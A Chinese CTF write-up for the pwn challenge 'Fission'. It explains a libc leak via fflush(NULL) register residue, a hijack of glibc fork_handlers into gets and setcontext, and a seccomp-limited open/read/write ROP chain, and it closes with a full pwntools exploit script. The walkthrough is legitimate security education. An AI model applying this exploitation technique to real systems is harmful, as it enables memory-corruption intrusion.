# UniCTF - Fission

这题是围绕对 `fork_handlers` 的利用来设计的。核心思路是利用一次小范围任意写，篡改 glibc 中 `fork_handlers`，在 `fork()` 时触发 `gets -> setcontext`，最终拼 ORW 链读出 flag。`fork_handlers` 的原理与利用细节可以直接参考这篇文章：

- https://sashactf.gitbook.io/pwn-notes/pwn/fork_gadget

---

## 保护与环境

```bash
❯ checksec vuln
[*] '/home/neptune/unictf/Fission/vuln'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
```

程序还开启了 seccomp，

```bash
❯ seccomp-tools dump ./vuln
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
 0002: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS
 0003: 0x20 0x00 0x00 0x00000000  A = sys_number
 0004: 0x15 0x00 0x01 0x00000000  if (A != read) goto 0006
 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0006: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0008
 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0008: 0x15 0x00 0x01 0x00000101  if (A != openat) goto 0010
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0010: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0012
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0012: 0x15 0x00 0x01 0x00000039  if (A != fork) goto 0014
 0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0014: 0x15 0x00 0x01 0x0000000e  if (A != rt_sigprocmask) goto 0016
 0015: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0016: 0x15 0x00 0x01 0x0000000f  if (A != rt_sigreturn) goto 0018
 0017: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0018: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS
```

只允许上面白名单中的几个系统调用，所以只能打 ORW。

---

## 反编译

可以看到反编译后的程序非常精简，设置 seccomp，触发一次 `fflush(0)`，运行一下打印出了某个地址；接着读取任意写的地址和大小，然后任意写，最后调用 `fork` 后立即通过系统调用退出，而程序在 `fork()` 之前还做了两件很关键的事情：

### 1) 限制 fd 数量

反编译开头出现了 `close(3..255)` + `setrlimit(RLIMIT_NOFILE, 4)` 的逻辑，并且 `xmmword_A50` 就是 `rlim_cur=4, rlim_max=4` 的打包常量。这样一来：

- 进程启动时只剩下 `0/1/2`
- `openat("flag")` 拿到 `fd=3` 是预期解必须的
- 之后想再 `openat("/proc/self/fd/0")` 会直接 `EMFILE`
- 由于不允许 `close`，无法回收 fd

这一步专门封住了重新打开 `stdin` 得到新 `fd` 再多次小 `read` 的绕法。

### 2) 二段 seccomp

反编译中后段出现多组 `xmmword_*` 的加载，它们拼出的就是第二段 BPF。按语义理解，规则是：

- `fork()` 触发前才安装第二段
- 只对 `read` 做严格参数过滤：
  - `fd==0` 时：仅允许 `count<=1` 且 `buf==stdin_buf`
  - `fd!=0` 时：允许 `count<=0x100`
  - 其他情况直接 `KILL`

#### xmmword 与条件的对应

`xmmword` 里应该是每条 8 字节的两条 `sock_filter` 拼在一起，字段布局为：`[code(16)][jt(8)][jf(8)][k(32)]`。把 `xmmword` 拆成两个 64-bit，再按小端还原字段，就能对应到这些条件。对应关系如下：

- `xmmword_9D0 / 9E0 / 9F0`：arch 检查 + 默认 `KILL/ALLOW` 框架。
- `xmmword_A30`：`fd` 的低/高 32 位校验，`fd==0` 才进入严格分支。
- `xmmword_A40`：`count<=1` 的阈值判断，只允许 stdin 1 字节小读。
- `xmmword_A50 / A60`：`buf` 和 `stdin_buf` 比较的低/高 32 位匹配。
- `xmmword_A70 / A20 / A10 / A00`：`fd!=0` 的回退分支 `count<=0x100` 以及 `RET ALLOW/KILL` 的组合。

```c
void __fastcall __noreturn main(int a1, char **a2, char **a3)
{
  int i; // ebx
  int v4; // edx
  int v5; // ecx
  int v6; // r8d
  int v7; // r9d
  unsigned __int64 n0xF; // r15
  __int64 chk; // rax
  unsigned __int64 n0x65_1; // r15
  __int64 v11; // r12
  unsigned __int64 n0x65_2; // r13
  ssize_t v13; // rax
  __int16 n21; // [rsp+0h] [rbp-118h] BYREF
  int v15; // [rsp+2h] [rbp-116h]
  __int16 v16; // [rsp+6h] [rbp-112h]
  _BYTE *rlimits_1; // [rsp+8h] [rbp-110h]
  __int64 v18; // [rsp+10h] [rbp-108h] BYREF
  unsigned __int64 n0x65; // [rsp+18h] [rbp-100h]
  _BYTE rlimits[168]; // [rsp+20h] [rbp-F8h] BYREF
  __int64 v21; // [rsp+C8h] [rbp-50h]
  int n16777237; // [rsp+D0h] [rbp-48h]
  int v23; // [rsp+D4h] [rbp-44h]
  __int128 v24; // [rsp+D8h] [rbp-40h]

  for ( i = 3; i != 256; ++i )
    close(i);
  *(_OWORD *)rlimits = xmmword_A80;
  if ( !setrlimit(RLIMIT_NOFILE, (const struct rlimit *)rlimits) )
  {
    setvbuf(stdin, &buf, 0, 1u);
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stderr, 0, 2, 0);
    memcpy(rlimits, &src_, sizeof(rlimits));
    n21 = 21;
    v15 = 0;
    v16 = 0;
    rlimits_1 = rlimits;
    if ( !prctl(38, 1, 0, 0, 0) && !prctl(22, 2, &n21) )
    {
      n0xF = 0;
      sub_1F80(22, 2, v4, v5, v6, v7, n21);
      fflush(0);
      write(1, 0, 8u);
      do
      {
        chk = _read_chk(0, (char *)&v18 + n0xF, 16 - n0xF);
        if ( chk <= 0 )
          goto LABEL_15;
        n0xF += chk;
      }
      while ( n0xF <= 0xF );
      n0x65_1 = n0x65;
      if ( n0x65 < 0x65 )
      {
        if ( n0x65 )
        {
          v11 = v18;
          n0x65_2 = 0;
          while ( 1 )
          {
            v13 = read(0, (void *)(v11 + n0x65_2), n0x65_1 - n0x65_2);
            if ( v13 <= 0 )
              break;
            n0x65_2 += v13;
            if ( n0x65_2 >= n0x65_1 )
              goto LABEL_14;
          }
        }
        else
        {
LABEL_14:
          *(_OWORD *)rlimits = xmmword_9D0;
          *(_OWORD *)&rlimits[16] = xmmword_9E0;
          *(_OWORD *)&rlimits[32] = xmmword_9F0;
          *(_OWORD *)&rlimits[48] = xmmword_A40;
          *(_OWORD *)&rlimits[64] = xmmword_A60;
          *(_OWORD *)&rlimits[80] = xmmword_A30;
          *(_OWORD *)&rlimits[96] = xmmword_A50;
          *(_OWORD *)&rlimits[112] = xmmword_A10;
          *(_OWORD *)&rlimits[128] = xmmword_A00;
          *(_OWORD *)&rlimits[144] = xmmword_A70;
          *(_DWORD *)&rlimits[160] = 50331669;
          *(_DWORD *)&rlimits[164] = (unsigned int)&buf;
          v21 = 0x1C00000020LL;
          n16777237 = 16777237;
          v23 = (unsigned __int64)&buf >> 32;
          v24 = xmmword_A20;
          n21 = 25;
          v15 = 0;
          v16 = 0;
          rlimits_1 = rlimits;
          if ( !prctl(22, 2, &n21) )
          {
LABEL_16:
            fork();
            syscall(60, 0);
            JUMPOUT(0x1F77);
          }
        }
      }
    }
  }
LABEL_15:
  syscall(60, 0);
  goto LABEL_16;
}

unsigned __int64 sub_1F80(int n22, int n2, ...)
{
  gcc_va_list va; // [rsp+B0h] [rbp-28h] BYREF
  unsigned __int64 v4; // [rsp+D0h] [rbp-8h]

  va_start(va, n2);
  v4 = __readfsqword(0x28u);
  _vprintf_chk(2, "gift: ", va);
  return __readfsqword(0x28u);
}

.rodata:00000000000009D0 _rodata         segment para public 'CONST' use64
.rodata:00000000000009D0                 assume cs:_rodata
.rodata:00000000000009D0                 ;org 9D0h
.rodata:00000000000009D0 xmmword_9D0     xmmword 0C000003E000100150000000400000020h
.rodata:00000000000009D0                                         ; DATA XREF: main+1C6↓r
.rodata:00000000000009E0 xmmword_9E0     xmmword 208000000000000006h
.rodata:00000000000009E0                                         ; DATA XREF: main+1D2↓r
.rodata:00000000000009F0 xmmword_9F0     xmmword 7FFF0000000000060000000000010015h
.rodata:00000000000009F0                                         ; DATA XREF: main+1DE↓r
.rodata:0000000000000A00 xmmword_A00     xmmword 20000000200000000007000015h
.rodata:0000000000000A00                                         ; DATA XREF: main+22C↓r
.rodata:0000000000000A10 xmmword_A10     xmmword 24000000207FFF000000000006h
.rodata:0000000000000A10                                         ; DATA XREF: main+21D↓r
.rodata:0000000000000A20 xmmword_A20     xmmword 80000000000000067FFF000000000006h
.rodata:0000000000000A20                                         ; DATA XREF: main+281↓r
.rodata:0000000000000A30 xmmword_A30     xmmword 0C0000150000002400000020h
.rodata:0000000000000A30                                         ; DATA XREF: main+202↓r
.rodata:0000000000000A40 xmmword_A40     xmmword 20000150000001000000020h
.rodata:0000000000000A40                                         ; DATA XREF: main+1EA↓r
.rodata:0000000000000A50 xmmword_A50     xmmword 100000A00250000002000000020h
.rodata:0000000000000A50                                         ; DATA XREF: main+20E↓r
.rodata:0000000000000A60 xmmword_A60     xmmword 500150000001400000020h
.rodata:0000000000000A60                                         ; DATA XREF: main+1F6↓r
.rodata:0000000000000A70 xmmword_A70     xmmword 18000000200000000100050025h
.rodata:0000000000000A70                                         ; DATA XREF: main+23B↓r
.rodata:0000000000000A80 xmmword_A80     xmmword 40000000000000004h
.rodata:0000000000000A80                                         ; DATA XREF: main+3F↓r
```

可以看到程序提供：

- libc 泄漏：`fflush(NULL)` 返回前的寄存器残留 + `write(1, rdi, 8)`
- 一次任意地址写：`read` 到任意地址，大小为 100 字节
- 退出前调用 `fork()`：一定触发 fork handlers

> IDA 把 `rsi` 误还原成 0，真实为 `mov rsi, rdi`，因此是 `write(1, rdi, 8)` 泄漏。

---

## 漏洞点总结

1. 通过 `fflush(NULL)` 的寄存器残留泄漏 libc 指针
2. 小范围任意写
3. `fork()` 被调用

---

## `fflush(NULL)` 泄漏说明

从反汇编可以看到一段固定序列：

```
.text:0000000000001DB9                 call    sub_1F80
.text:0000000000001DB9
.text:0000000000001DBE                 xor     edi, edi        ; stream
.text:0000000000001DC0                 call    cs:fflush_ptr
.text:0000000000001DC0
.text:0000000000001DC6                 mov     rsi, rdi        ; buf
.text:0000000000001DC9                 mov     edx, 8          ; n
.text:0000000000001DCE                 mov     edi, 1          ; fd
.text:0000000000001DD3                 call    cs:write_ptr
```

关键在于 `fflush(NULL)` 返回后 `rdi` 保留为指向栈上 cleanup buffer 的指针。
随后程序执行 `write(1, rdi, 8)`，将 `rdi` 指向的内存的前 8 字节输出到 stdout。

需要注意的是：
- `rdi` 是一个栈地址，指向 `_pthread_cleanup_buffer` 结构
- 该结构的第一个字段 `__prev` 是一个指向 libc 内部的指针
- `write(1, rdi, 8)` 输出的就是这个 `__prev` 字段的值
- 该值在本题中固定为 `libc_base + 0x8f1e0`

执行流程如下：
1. `fflush(NULL)` → `__libc_cleanup_pop_restore(&_buffer)` 
2. 函数返回时 `rdi = &_buffer`
3. `write(1, rdi, 8)` 输出 `_buffer` 的前 8 字节内容
4. 该内容是一个 libc 指针，可用于计算 libc 基址

结合 glibc 源码可以更清晰地理解 `rdi` 的来源：

- `fflush(NULL)` 会遍历所有 `FILE` 并调用 `_IO_flush_all`。
- `_IO_flush_all_lockp` 结束时会调用 `_IO_cleanup_region_end(0)`。
- `_IO_cleanup_region_end` 最终调用 `__libc_cleanup_pop_restore`，其第一个参数是栈上的 cleanup buffer，保存在寄存器中并沿用到返回路径。

对应的 `__libc_cleanup_pop_restore` 实现：

```c
void
__libc_cleanup_pop_restore (struct _pthread_cleanup_buffer *buffer)
{
  struct pthread *self = THREAD_SELF;

  THREAD_SETMEM (self, cleanup, buffer->__prev);

  int cancelhandling = atomic_load_relaxed (&self->cancelhandling);
  if (buffer->__canceltype != PTHREAD_CANCEL_DEFERRED
      && (cancelhandling & CANCELTYPE_BITMASK) == 0)
    {
      int newval;
      do
	{
	  newval = cancelhandling | CANCELTYPE_BITMASK;
	}
      while (!atomic_compare_exchange_weak_acquire (&self->cancelhandling,
						    &cancelhandling, newval));

      if (cancel_enabled_and_canceled (cancelhandling))
	__do_cancel (PTHREAD_CANCELED);
    }
}
libc_hidden_def (__libc_cleanup_pop_restore)
```

在实际运行中，该 qword 落在 libc 映射区，其偏移固定为 `libc_base + 0x8f1e0`。`_pthread_cleanup_buffer` 结构的第一个字段通常是 `__prev` 指针，它指向上一个 cleanup buffer。在 `fflush(NULL)` 的执行过程中，这个字段会被设置为指向 glibc 内部的某个固定位置，因此可以用来泄漏 libc 地址。偏移获取方式如下：

1. 用提供的 `ld-linux-x86-64.so.2` 启动一个最小复现程序，`fflush(NULL)` 后从 `rdi` 取 cleanup buffer 指针，并打印首 qword。
2. 对该地址执行 `dladdr`，得到 `libc` 的 `dli_fbase`，计算：
  $$
  	\text{offset} = \text{leak} - \text{libc\_base}
  $$
3. 得到 `0x8f1e0`。

复现程序如下：

```c
#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

int main(void)
{
	void *cleanup_buf;
	uint64_t leak;
	Dl_info info;

	printf("gift: ");
	fflush(NULL);
	asm volatile("mov %%rdi, %0" : "=r"(cleanup_buf));
	leak = *(uint64_t *)cleanup_buf;

	if (dladdr((void *)leak, &info) == 0) {
		puts("dladdr failed");
		return 1;
	}

	printf("cleanup_buf=%p\n", cleanup_buf);
	printf("leak=%p\n", (void *)leak);
	printf("libc_base=%p\n", info.dli_fbase);
	printf("offset=0x%lx\n", leak - (uint64_t)info.dli_fbase);
	return 0;
}
```

编译运行：

```bash
❯ gcc -O0 -no-pie -fno-pie -ldl offset.c -o offset
❯ ./ld-linux-x86-64.so.2 --library-path . ./offset
gift: cleanup_buf=0x7fffffffd7b0
leak=0x7ffff7c8f1e0
libc_base=0x7ffff7c00000
offset=0x8f1e0
```

$$
  	\text{libc\_base} = \text{leak} - 0x8f1e0
$$

加上 seccomp 禁用 `execve`，只能走 ORW。

其实 pwndbg 简单动调一下即可，很明显是 libc 的地址，在本地调试时关闭 ASLR 减去 libc 基址就是偏移量，打远程时拿到泄漏的地址，减去偏移量就能得到远程 ASLR 开启下的 libc 基址了。 

---

## 利用思路

### 1) fork handlers 结构 (glibc 2.36+ / 2.42)

在 2.36+ 版本，`fork_handler` 增加了 `id` 字段：

- 每个 handler 大小 `0x28`
- 结构中需写入 `id`

出题人在本地对 Ubuntu 和 Arch 的 libc 进行 objdump 查看反汇编代码，发现 `fork_handlers` 在 2.42 上地址必定为：

```python
fork_handlers = libc.sym.re_syntax_options + 0x80
```

### 2) 小写一次 + 二段式

由于单次写限制大小，不能写入完整的 `ucontext + ROP`，所以采用两段式：

- **payload1**：写入 `fork_handlers` 结构，让 `fork()` 依次执行：
  1. `gets(ctx_addr)`
  2. `setcontext(ctx_addr)`
- **payload2**：由 `gets` 从 stdin 写入，包含 `ucontext` 和 ORW ROP 链

这样只需要一次小写，后续大 payload 由 `gets` 引导输入。

> 这里要注意一个问题，`gets` 读取的 payload2 中不能用 `\x0A`，这样会被 `gets` 当作换行符而导致攻击失败。出题人其实本来做的是 Ubuntu 25.10 的镜像，但是 libc 中 唯一的 `syscall ret` gadget 中居然存在 `\x0A`，而且就算开启了 ASLR，libc 基址的低 5 字节也很诡异地不发生变化，导致在本地调试时必定失败，而攻击远程测试 docker 时却没问题，另外一位 PWN 方向的出题人也复现了这个问题，所以为了减少困扰，决定将镜像更换为 archlinux，对做题没有影响。

### 3) setcontext + ORW

`setcontext` 用来切换寄存器到 ROP 栈。

ORW 链：

- `openat(AT_FDCWD, "flag", 0)`
- `read(fd, buf, 0x80)`
- `write(1, buf, 0x80)`

---

## 构造

```python
# payload1: fork_handlers -> gets -> setcontext
payload1 = forge(fork_handlers, libc.sym.gets, libc.sym.setcontext, rdi=ctx_addr)

# payload2: ucontext + ORW chain
payload2 = ucontext
payload2 += chain
payload2 += b"\x00" * BUF_SIZE
payload2 += b"flag\x00"
```

发送顺序：
1. 写入 payload1
2. 通过 `gets` 输入 payload2

---

## 总结

1. `fflush(0)` 后 `write(1, rdi, 8)` 泄漏 libc 指针，计算 libc base
2. 定位 `fork_handlers`
3. 用第一次写改 `fork_handlers` 为 `gets -> setcontext`
4. `fork()` 触发 `gets`，写入 `ucontext + ROP`
5. `setcontext` 切换到 ROP 执行 ORW

---

# exp

```python
#!/usr/bin/env python3
from pwn import *

context.log_level = "debug"
context.arch = "amd64"

# io = process("./vuln_patched")
io = remote("localhost", 9999)

libc = ELF("./libc.so.6")

# glibc 2.28-2.35
# HANDLER_SZ, HAS_ID = 0x20, False
# glibc 2.36+
HANDLER_SZ, HAS_ID = 0x28, True


def header(array_ptr, used):
    return p64(used) * 2 + p64(array_ptr)


def handler_array(*funcs):
    assert funcs
    n = len(funcs)
    total = HANDLER_SZ * n - (0x18 if not HAS_ID else 0)
    data = bytearray(total)

    for i, fn in enumerate(funcs[::-1]):
        off = i * HANDLER_SZ
        data[off : off + 8] = p64(fn)
        if HAS_ID:
            data[off + 0x20 : off + 0x28] = p64(i)

    """
    After testing, when using libc's system() and /bin/sh,
    there's no need to fill the trailing zeros. Only if
    writing a custom /bin/sh string, the trailing zeros
    are needed to avoid issues, but also, just aligning to
    8 bytes is sufficient. Add a b"\x00\x00" e.g. is enough,
    like return bytes(data).rstrip(b'\x00') + b"\x00\x00".
    """
    return bytes(data).rstrip(b"\x00") + b"\x00\x00"


def forge(base, *funcs, rdi=None):
    assert funcs
    n = len(funcs)

    if rdi is None:
        used = n
        array_ptr = base + 0x18
    else:
        used = rdi
        array_ptr = (base + 0x18 - (used - n) * HANDLER_SZ) & 0xFFFFFFFFFFFFFFFF

    return header(array_ptr, used) + handler_array(*funcs)


def build_ucontext(rsp, rip, rdi=0, rsi=0, rdx=0):
    frame = SigreturnFrame()
    frame.rsp = rsp
    frame.rip = rip
    frame.rdi = rdi
    frame.rsi = rsi
    frame.rdx = rdx
    setattr(frame, "&fpstate", rsp + 0x1A8)
    fpstate = {
        0x00: p16(0x37F),  # cwd
        0x02: p16(0xFFFF),  # swd
        0x04: p16(0x0),  # ftw
        0x06: p16(0xFFFF),  # fop
        0x08: 0xFFFFFFFF,  # rip
        0x10: 0x0,  # rdp
        0x18: 0x1F80,  # mxcsr
    }
    return flat(
        {
            0x00: bytes(frame),
            0x128: 0,
            0x1A8: fpstate,
        }
    )


io.recvuntil(b"gift: ")
leak = u64(io.recvn(8))
# fflush(NULL) cleanup buffer q[0] = libc_base + 0x8f1e0
libc.address = leak - 0x8F1E0
log.success(f"libc base: {hex(libc.address)}")

# After my local tests, following are the addresses of fork_handlers in different glibc versions.
# For glibc 2.31:
# objdump -d libc.so.6 | grep "<__abort_msg@@GLIBC_PRIVATE+0xbe0>"
# For glibc 2.35:
# objdump -d libc.so.6 | grep "<getdate_err@@GLIBC_2.2.5+0x300>"
# For glibc 2.39/2.41/2.42:
# objdump -d libc.so.6 | grep "<re_syntax_options@@GLIBC_2.2.5+0x80>"
fork_handlers = libc.sym.re_syntax_options + 0x80
log.success(f"fork_handlers: {hex(fork_handlers)}")

rop = ROP(libc)
ret = rop.find_gadget(["ret"])[0]
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
pop_rsi = rop.find_gadget(["pop rsi", "ret"])[0]
pop_rax = rop.find_gadget(["pop rax", "ret"])[0]
syscall = rop.find_gadget(["syscall", "ret"])[0]

# BUF_SIZE is used for both read/write buffer size and as rdx value.
# Since there's no good gadget to control rdx separately, we set it to 0x80.
# As openat() flags, 0x80 = O_EXCL, which has no effect when opening existing files.
# As read/write count, 0x80, which 128 bytes is sufficient for reading the flag.
# 0x100 = O_NOCTTY, which has no effect on regular files, is also a great choice.
BUF_SIZE = 0x80
ctx_addr = fork_handlers + 0x200


def build_chain(buf_addr, path_addr):
    # openat(AT_FDCWD, "flag", rdx) rdx = BUF_SIZE = 0x80 (O_EXCL)
    # read(fd, buf, rdx)            rdx = BUF_SIZE = 0x80 (128 bytes)
    # write(1, buf, rdx)            rdx = BUF_SIZE = 0x80 (128 bytes)
    return flat(
        [
            pop_rdi,
            constants.AT_FDCWD,
            pop_rsi,
            path_addr,
            pop_rax,
            constants.SYS_openat,
            syscall,
            pop_rdi,
            3,
            pop_rsi,
            buf_addr,
            pop_rax,
            constants.SYS_read,
            syscall,
            pop_rdi,
            1,
            pop_rsi,
            buf_addr,
            pop_rax,
            constants.SYS_write,
            syscall,
        ]
    )


ucontext_size = len(build_ucontext(0, 0))
rop_addr = ctx_addr + ucontext_size
chain = build_chain(0, 0)
buf_addr = rop_addr + len(chain)
path_addr = buf_addr + BUF_SIZE
chain = build_chain(buf_addr, path_addr)
ucontext = build_ucontext(rop_addr, ret, rdx=BUF_SIZE)

payload1 = forge(fork_handlers, libc.sym.gets, libc.sym.setcontext, rdi=ctx_addr)

payload2 = ucontext
payload2 += chain
payload2 += b"\x00" * BUF_SIZE
payload2 += b"flag\x00"

if b"\n" in payload2:
    raise ValueError("payload2 contains newline; try again due to ASLR")

req1 = p64(fork_handlers) + p64(len(payload1))

io.send(req1)
io.send(payload1)
io.sendline(payload2)

io.interactive()
```

## 参考链接

- fork handler 原理与利用：
  https://sashactf.gitbook.io/pwn-notes/pwn/fork_gadget

- setcontext/SROP 相关：
  https://sashactf.gitbook.io/pwn-notes/pwn/setcontext
